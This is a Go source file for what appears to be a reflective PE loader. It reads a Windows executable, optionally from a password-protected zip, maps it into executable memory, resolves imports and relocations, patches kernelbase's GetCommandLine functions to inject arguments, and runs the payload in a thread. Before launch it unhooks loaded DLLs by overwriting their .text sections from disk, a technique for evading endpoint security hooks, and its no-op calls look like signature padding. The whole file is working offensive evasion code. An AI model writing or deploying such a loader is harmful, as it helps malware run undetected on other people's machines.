package pe

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"reflectgo/api"
	"reflectgo/utils"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/alexmullins/zip"
	"golang.org/x/sys/windows"
)

type PeData struct {
	file   string
	params string

	isDebug        bool
	startAddress   uintptr
	currentProcess windows.Handle
}

func New(file, params string) (pe *PeData) {
	pe = new(PeData)
	pe.file = file
	pe.params = params

	return
}

func (pe *PeData) Debug() {
	pe.isDebug = true
}
func (pe *PeData) Exec() error {
	process, err := windows.GetCurrentProcess()
	if err != nil {
		return fmt.Errorf("get current process error: %v\n", err)
	}
	pe.currentProcess = process
	err = pe.loadPe()
	if err != nil {
		return err
	}

	err = pe.unHook()
	if err != nil {
		return err
	}

	err = pe.fixAgrs()
	if err != nil {
		return err
	}

	pe.log("Exec", pe.file, pe.params)
	return pe.execAsm()
}

func nop() {
	fmt.Printf("")
}

func (pe *PeData) unHook() error {
	pe.log("unHook", pe.file)
	modules, err := api.FindAllDLL(uintptr(windows.GetCurrentProcessId()))
	if err != nil {
		return err
	}

	for _, module := range modules {
		pe.restoreDLL(pe.currentProcess, module)
	}
	return nil
}

func (pe *PeData) restoreDLL(currentProcess windows.Handle, module string) error {
	libHandler, err := windows.LoadLibrary(module)
	if err != nil {
		return errors.New("LoadLibrary" + module + " err: " + err.Error())
	}
	defer windows.CloseHandle(libHandler)

	var libInfo windows.ModuleInfo
	err = windows.GetModuleInformation(currentProcess, libHandler, &libInfo, uint32(unsafe.Sizeof(libInfo)))
	if err != nil {
		return errors.New("GetModuleInformation" + module + " err: " + err.Error())
	}

	var pbi api.PROCESS_BASIC_INFORMATION
	pbiLen := uint32(unsafe.Sizeof(pbi))
	err = windows.NtQueryInformationProcess(currentProcess, windows.ProcessBasicInformation, unsafe.Pointer(&pbi), pbiLen, nil)
	if err != nil {
		return errors.New("NtQueryInformationProcess" + module + " err: " + err.Error())
	}

	var peb windows.PEB
	s := uintptr(unsafe.Sizeof(peb))
	err = windows.ReadProcessMemory(currentProcess, pbi.PebBaseAddress, (*byte)(unsafe.Pointer(&peb)), s, nil)
	if err != nil {
		return errors.New("ReadProcessMemory peb err: " + err.Error())
	}

	var pImageHeader api.IMAGE_DOS_HEADER
	s = uintptr(unsafe.Sizeof(pImageHeader))
	err = windows.ReadProcessMemory(currentProcess, libInfo.BaseOfDll, (*byte)(unsafe.Pointer(&pImageHeader)), s, nil)
	if err != nil {
		return errors.New("ReadProcessMemory pImageHeader err: " + err.Error())
	}

	ntHeaderOffset := pImageHeader.E_lfanew
	var pOldNtHeader api.IMAGE_NT_HEADERS
	s = uintptr(unsafe.Sizeof(pOldNtHeader))
	err = windows.ReadProcessMemory(currentProcess, libInfo.BaseOfDll+uintptr(ntHeaderOffset), (*byte)(unsafe.Pointer(&pOldNtHeader)), s, nil)
	if err != nil {
		return errors.New("ReadProcessMemory pOldNtHeader err: " + err.Error())
	}

	sectionHeaderOffset := uint16(uintptr(pImageHeader.E_lfanew) + unsafe.Sizeof(api.IMAGE_NT_HEADERS{}.Signature) + unsafe.Sizeof(api.IMAGE_NT_HEADERS{}.FileHeader) + unsafe.Sizeof(api.IMAGE_NT_HEADERS{}.OptionalHeader))
	var sectionHeader api.ImageSectionHeader
	const sectionHeaderSize = unsafe.Sizeof(sectionHeader)
	for i := api.WORD(0); i != pOldNtHeader.FileHeader.NumberOfSections; i++ {
		err = windows.ReadProcessMemory(currentProcess, libInfo.BaseOfDll+uintptr(sectionHeaderOffset), (*byte)(unsafe.Pointer(&sectionHeader)), sectionHeaderSize, nil)
		if err != nil {
			return errors.New("ReadProcessMemory sectionHeader err: " + err.Error())
		}
		var secName []byte
		for _, b := range sectionHeader.Name {
			if b == 0 {
				break
			}
			secName = append(secName, byte(b))
		}

		if string(secName) == ".text" {
			dllPath := "C:\\Windows\\System32\\" + module
			if _, err := os.Stat(dllPath); err == nil {
				pe.log("\trestore", module)
				f, err := os.Open(dllPath)
				if err != nil {
					return errors.New("Open " + dllPath + " err: " + err.Error())
				}
				defer f.Close()
				// p, err := syscall.UTF16PtrFromString("C:\\Windows\\System32\\" + module)
				// if err != nil {
				// 	panic(err)
				// }
				// h, err := syscall.CreateFile(p, windows.GENERIC_READ, windows.FILE_SHARE_READ, nil, syscall.OPEN_EXISTING, 0, 0)
				// if err != nil {
				// 	panic(err)
				// }

				h, err := syscall.CreateFileMapping(syscall.Handle(f.Fd()), nil, syscall.PAGE_READONLY|0x01000000, 0, 0, nil)
				if h == 0 {
					return errors.New("CreateFileMapping err: " + err.Error())
				}

				addr, err := syscall.MapViewOfFile(h, syscall.FILE_MAP_READ, 0, 0, 0)
				if addr == 0 {
					return errors.New("MapViewOfFile err: " + err.Error())
				}

				originDllData := (*byte)(unsafe.Pointer(addr + uintptr(sectionHeader.VirtualAddress)))
				var oldProtect uint32
				err = windows.VirtualProtect(libInfo.BaseOfDll+uintptr(sectionHeader.VirtualAddress), uintptr(sectionHeader.PhysicalAddressOrVirtualSize), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
				if err != nil {
					return errors.New("VirtualProtect err: " + err.Error())
				}

				err = windows.WriteProcessMemory(currentProcess, libInfo.BaseOfDll+uintptr(sectionHeader.VirtualAddress), originDllData, uintptr(sectionHeader.PhysicalAddressOrVirtualSize), nil)
				if err != nil {
					return errors.New("WriteProcessMemory err: " + err.Error())
				}

				err = windows.VirtualProtect(libInfo.BaseOfDll+uintptr(sectionHeader.VirtualAddress), uintptr(sectionHeader.PhysicalAddressOrVirtualSize), oldProtect, &oldProtect)
				if err != nil {
					return errors.New("VirtualProtect err: " + err.Error())
				}

				err = syscall.UnmapViewOfFile(addr)
				if err != nil {
					return errors.New("UnmapViewOfFile err: " + err.Error())
				}
				windows.CloseHandle(windows.Handle(h))
			}
			break
		}
		sectionHeaderOffset = sectionHeaderOffset + uint16(sectionHeaderSize)
	}
	return nil
}

func (pe *PeData) loadPe() error {
	var (
		pSourceBytes []byte
		err          error
	)

	ext := filepath.Ext(pe.file)
	if ext == ".zip" {
		pSourceBytes, err = pe.unZipFile(pe.file)
		if err != nil {
			return err
		}
	} else {
		pSourceBytes, err = os.ReadFile(pe.file)
		if err != nil {
			return err
		}
	}

	var pImageHeader api.IMAGE_DOS_HEADER
	rdrBytes := bytes.NewReader(pSourceBytes)
	err = binary.Read(rdrBytes, binary.LittleEndian, &pImageHeader)
	if err != nil {
		return fmt.Errorf("Parse pImageHeader error: %s\n", err)
	}

	ntHeaderOffset := pImageHeader.E_lfanew

	var pOldNtHeader = new(api.IMAGE_NT_HEADERS)
	rdrBytes = bytes.NewReader(pSourceBytes[ntHeaderOffset:])
	err = binary.Read(rdrBytes, binary.LittleEndian, pOldNtHeader)
	if err != nil {
		return fmt.Errorf("Parse pOldNtHeader error: %s\n", err)
	}

	oldPeAddress := pOldNtHeader.OptionalHeader.ImageBase
	pImageBase := api.VirtualAlloc(uintptr(oldPeAddress), int(pOldNtHeader.OptionalHeader.SizeOfImage), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if pImageBase == 0 {
		nop()
		pImageBase = api.VirtualAlloc(uintptr(0), int(pOldNtHeader.OptionalHeader.SizeOfImage), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	}
	pOldNtHeader.OptionalHeader.ImageBase = api.ULONGLONG(pImageBase)
	pe.log("ImageBase at", unsafe.Pointer(pImageBase))

	//write header
	nop()
	api.WriteMemory(pImageBase, pSourceBytes, uintptr(pOldNtHeader.OptionalHeader.SizeOfHeaders))

	sectionHeaderOffset := uint16(uintptr(pImageHeader.E_lfanew) + unsafe.Sizeof(api.IMAGE_NT_HEADERS{}.Signature) + unsafe.Sizeof(api.IMAGE_NT_HEADERS{}.FileHeader) + unsafe.Sizeof(api.IMAGE_NT_HEADERS{}.OptionalHeader))
	var sectionHeader api.IMAGE_SECTION_HEADER
	const sectionHeaderSize = unsafe.Sizeof(sectionHeader)

	// write all sections
	pe.log("Write Section")
	for i := api.WORD(0); i != pOldNtHeader.FileHeader.NumberOfSections; i++ {
		rdrBytes = bytes.NewReader(pSourceBytes[sectionHeaderOffset:])
		err = binary.Read(rdrBytes, binary.LittleEndian, &sectionHeader)
		if err != nil {
			return fmt.Errorf("Parse sectionHeader error: %v\n", err)
		}

		var secName []byte
		for _, b := range sectionHeader.Name {
			if b == 0 {
				break
			}
			secName = append(secName, byte(b))
		}
		pe.log("\tSection", string(secName))
		api.WriteMemory(pImageBase+uintptr(sectionHeader.VirtualAddress), pSourceBytes[sectionHeader.PointerToRawData:], uintptr(sectionHeader.SizeOfRawData))
		sectionHeaderOffset = sectionHeaderOffset + uint16(sectionHeaderSize)
	}

	//fix IAT
	pe.log("Fix Import Table")
	iatSize := uintptr(pOldNtHeader.OptionalHeader.DataDirectory[1].Size)
	for parsedSize := uintptr(0); parsedSize < iatSize; parsedSize += unsafe.Sizeof(api.IMAGE_IMPORT_DESCRIPTOR{}) {
		importDesc := (*api.IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(pImageBase + parsedSize + uintptr(pOldNtHeader.OptionalHeader.DataDirectory[1].VirtualAddress)))
		if importDesc.OriginalFirstThunk == 0 && importDesc.FirstThunk == 0 {
			break
		}

		libName := windows.BytePtrToString((*byte)(unsafe.Pointer(pImageBase + uintptr(importDesc.Name))))
		pe.log("Import", libName)
		libHandler, err := windows.LoadLibrary(libName)
		if err != nil {
			return fmt.Errorf("Load dll %s error: %v\n", err, libName)
		}

		offsetThunk := uintptr(0)
		offsetField := uintptr(0)
		for {
			fieldThunk := (*api.IMAGE_THUNK_DATA64)(unsafe.Pointer(pImageBase + offsetField + uintptr(importDesc.FirstThunk)))
			orginThunk := (*api.IMAGE_THUNK_DATA64)(unsafe.Pointer(pImageBase + offsetThunk + uintptr(importDesc.OriginalFirstThunk)))
			if fieldThunk.AddressOfData == 0 {
				break
			}

			proc := uintptr(0)
			funcName := ""

			if orginThunk.AddressOfData>>63 == 1 { //Import by ordinal
				proc = uintptr(unsafe.Pointer(uintptr(orginThunk.AddressOfData)))
				funcName = fmt.Sprintf("%x", orginThunk.AddressOfData)
			} else {
				byName := (*api.PIMAGE_IMPORT_BY_NAME)(unsafe.Pointer(pImageBase + uintptr(fieldThunk.AddressOfData)))
				funcName = windows.BytePtrToString(&byName.Name)
				proc, err = windows.GetProcAddress(libHandler, funcName)
				if err != nil {
					return fmt.Errorf("GetProcessAddress %s.%s error: %v\n", libName, funcName, err)
				}
			}

			pe.log(fmt.Sprintf("\tFix %s to %v", funcName, proc))
			fieldThunk.AddressOfData = api.ULONGLONG(proc)
			offsetThunk += unsafe.Sizeof(orginThunk)
			offsetField += unsafe.Sizeof(fieldThunk)
		}
	}

	if pImageBase != uintptr(oldPeAddress) {
		relocTable := &pOldNtHeader.OptionalHeader.DataDirectory[5]
		pe.fixRelocTable(pImageBase, uintptr(oldPeAddress), relocTable)
	}
	pe.startAddress = uintptr(unsafe.Pointer(pImageBase + uintptr(pOldNtHeader.OptionalHeader.AddressOfEntryPoint)))
	return nil
}

func (pe *PeData) cmd2Hex(newArgs string) []byte {
	param, err := hex.DecodeString(utils.String2Unicode(newArgs))
	if err != nil {
		pe.log("Error decoding shellcode:", err)
		return nil
	}

	return param
}

func (pe *PeData) fixAgrs() error {
	ex, err := os.Executable()
	if err != nil {
		return errors.New("unable to get executable: " + err.Error())
	}

	newArgs := `"` + ex + `" ` + pe.params
	pe.log("New args:", newArgs)

	param := pe.cmd2Hex(newArgs)
	// param, err := hex.DecodeString(utils.String2Unicode(newArgs))
	if param == nil {
		return errors.New("Error decoding shellcode: " + err.Error())
	}

	newAgrsAddr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(param)), windows.MEM_COMMIT|windows.MEM_RESERVE, syscall.PAGE_READWRITE)
	if err != nil {
		return errors.New("alloc memory error: " + err.Error())
	}

	pe.log("New args addr:", unsafe.Pointer(newAgrsAddr))
	nop()
	err = windows.WriteProcessMemory(pe.currentProcess, newAgrsAddr, &param[0], uintptr(len(param)), nil)
	if err != nil {
		return errors.New("write new agrs value to memory error " + err.Error())
	}

	// mov rax, newParamAddr
	commandLineWUpdate := []byte{0x48, 0xB8}
	commandLineWUpdate = append(commandLineWUpdate, utils.UintptrToBytes(&newAgrsAddr)...)
	commandLineWUpdate = append(commandLineWUpdate, []byte{0xC3}...)

	for _, cmd := range []string{
		"GetCommandLineW",
		"GetCommandLineA",
	} {
		funcGetCommandLineXAddr, err := api.Kernelbase.FindProc(cmd)
		if err != nil {
			return errors.New("find " + cmd + " address error: " + err.Error())
		}
		pe.log("kernelbase.", cmd, " address", unsafe.Pointer(funcGetCommandLineXAddr.Addr()))

		err = windows.WriteProcessMemory(pe.currentProcess, uintptr(unsafe.Pointer(funcGetCommandLineXAddr.Addr())), &commandLineWUpdate[0], uintptr(len(commandLineWUpdate)), nil)
		if err != nil {
			return errors.New("patched function kernelbase." + cmd + " error: " + err.Error())
		}

		pe.log("patched function kernelbase.", cmd, commandLineWUpdate)
	}

	var pbi windows.PROCESS_BASIC_INFORMATION
	pbiLen := uint32(unsafe.Sizeof(pbi))
	err = windows.NtQueryInformationProcess(pe.currentProcess, windows.ProcessBasicInformation, unsafe.Pointer(&pbi), pbiLen, &pbiLen)
	if err != nil {
		return errors.New("call QueryInformationProcess error: " + err.Error())
	}

	pe.log("PebBase address:", unsafe.Pointer(pbi.PebBaseAddress))
	pe.log("ProcessParameters address:", unsafe.Pointer(pbi.PebBaseAddress.ProcessParameters))
	pe.log("CommandLine address:", unsafe.Pointer(uintptr(unsafe.Pointer(pbi.PebBaseAddress.ProcessParameters))+uintptr(0x78)))
	pe.log("Buffer commandLine address:", unsafe.Pointer(uintptr(unsafe.Pointer(pbi.PebBaseAddress.ProcessParameters.CommandLine.Buffer))))

	return nil
}

func (pe *PeData) fixRelocTable(newAddr uintptr, oldAddr uintptr, relocDir *api.IMAGE_DATA_DIRECTORY) error {
	pe.log("Fix RelocTable:", newAddr, oldAddr)
	maxSize := relocDir.Size
	relocAddr := relocDir.VirtualAddress
	var reloc = &api.IMAGE_BASE_RELOCATION{}
	delta := newAddr - oldAddr
	process := uintptr(pe.currentProcess)

	for parsedSize := uintptr(0); parsedSize < uintptr(maxSize); parsedSize += uintptr(reloc.SizeOfBlock) {
		reloc = (*api.IMAGE_BASE_RELOCATION)(unsafe.Pointer(uintptr(relocAddr) + parsedSize + newAddr))
		if reloc.VirtualAdress == 0 || reloc.SizeOfBlock == 0 {
			break
		}

		entriesNum := int((uintptr(reloc.SizeOfBlock) - unsafe.Sizeof(api.IMAGE_BASE_RELOCATION{})) / unsafe.Sizeof(api.BASE_RELOCATION_ENTRY{}))
		pageAddr := reloc.VirtualAdress
		entry := (*api.BASE_RELOCATION_ENTRY)(unsafe.Pointer((uintptr(unsafe.Pointer(reloc)) + unsafe.Sizeof(api.IMAGE_BASE_RELOCATION{}))))
		for i := 0; i < entriesNum; i++ {
			var relocationAddr = uintptr(pageAddr) + uintptr(newAddr) + uintptr(entry.Offset())
			readAddr, err := api.ReadProcessMemoryAsAddr(process, relocationAddr)
			if err != nil {
				return fmt.Errorf("read memory as addr error: %v\n", err)
			}
			readAddr += delta

			err = api.WriteProcessMemoryAsAddr(process, relocationAddr, readAddr)
			if err != nil {
				return fmt.Errorf("write memory as addr error: %v\n", err)
			}

			entry = (*api.BASE_RELOCATION_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(entry)) + unsafe.Sizeof(api.BASE_RELOCATION_ENTRY{})))
		}
	}
	return nil
}

func (pe *PeData) execAsm() error {
	// syscall.Syscall(pe.startAddress, 0, 0, 0, 0)
	thread := api.CreateThread(pe.startAddress)
	nop()
	return api.WaitForSingleObject(thread, 0xFFFFFFFF)
}

func (pe *PeData) log(message ...interface{}) {
	if pe.isDebug {
		fmt.Printf("%s", time.Now().Format("02-01-2006 15:04:05 - "))
		fmt.Println(message...)
	}
}

func (pe *PeData) unZipFile(f string) ([]byte, error) {
	pe.log("unzip", f)
	zipr, err := zip.OpenReader(f)
	if err != nil {
		return nil, err
	}

	if len(zipr.File) < 1 {
		return nil, fmt.Errorf("zip file is empty")
	}

	z := zipr.File[0]
	if z.IsEncrypted() {
		password, err := getPassword()
		if err != nil {
			return nil, fmt.Errorf("get password error: %v", err)
		}
		z.SetPassword(password)
	}

	rr, err := z.Open()
	if err != nil {
		return nil, err
	}

	buf, err := ioutil.ReadAll(rr)
	if err != nil {
		return nil, err
	}
	defer rr.Close()

	return buf, nil
}

func getPassword() (text string, err error) {
	var modeOn, modeOff uint32
	stdin := syscall.Handle(os.Stdin.Fd())
	err = syscall.GetConsoleMode(stdin, &modeOn)
	if err != nil {
		return
	}
	modeOff = modeOn &^ 0x0004
	fmt.Printf("password:")
	_, _, _ = api.ProcSetConsoleMode.Call(uintptr(stdin), uintptr(modeOff))
	_, err = fmt.Scanln(&text)
	if err != nil {
		return
	}
	_, _, _ = api.ProcSetConsoleMode.Call(uintptr(stdin), uintptr(modeOn))
	fmt.Println()
	return strings.TrimSpace(text), nil
}

// not use
func runByChangeCommandLineValue() {
	process, err := windows.GetCurrentProcess()
	if err != nil {
		log.Fatalf("unable to get current process: %v", err)
	}

	var pbi windows.PROCESS_BASIC_INFORMATION
	pbiLen := uint32(unsafe.Sizeof(pbi))
	err = windows.NtQueryInformationProcess(process, windows.ProcessBasicInformation, unsafe.Pointer(&pbi), pbiLen, &pbiLen)
	if err != nil {
		panic(err)
	}

	payload := "01" + utils.String2Unicode("E:\\a.exe a")
	sc, err := hex.DecodeString(payload)
	if err != nil {
		fmt.Printf("\nError decoding shellcode: %s\n", err)
		os.Exit(1)
	}

	fmt.Println("payload Address", unsafe.Pointer(&sc[0]))
	fmt.Println("PebBaseAddress", unsafe.Pointer(pbi.PebBaseAddress))
	fmt.Println("ProcessParameters address", unsafe.Pointer(pbi.PebBaseAddress.ProcessParameters))
	fmt.Println("commandLine Address", unsafe.Pointer(uintptr(unsafe.Pointer(pbi.PebBaseAddress.ProcessParameters))+uintptr(0x78)))
	fmt.Println("buffer commandLine Address", unsafe.Pointer(uintptr(unsafe.Pointer(pbi.PebBaseAddress.ProcessParameters.CommandLine.Buffer))))

	err = windows.WriteProcessMemory(process, uintptr(unsafe.Pointer(pbi.PebBaseAddress.ProcessParameters.CommandLine.Buffer)), &sc[0], uintptr(len(sc)), nil)
	// err = windows.WriteProcessMemory(process, uintptr(0x78)+uintptr(unsafe.Pointer(pbi.PebBaseAddress.ProcessParameters)), &sc[0], uintptr(len(sc)), nil)
	if err != nil {
		log.Fatalf("WriteProcessMemory failed: %v", err)
	}
	// s1 := bin2shell()
	// execAsm(s1)

}
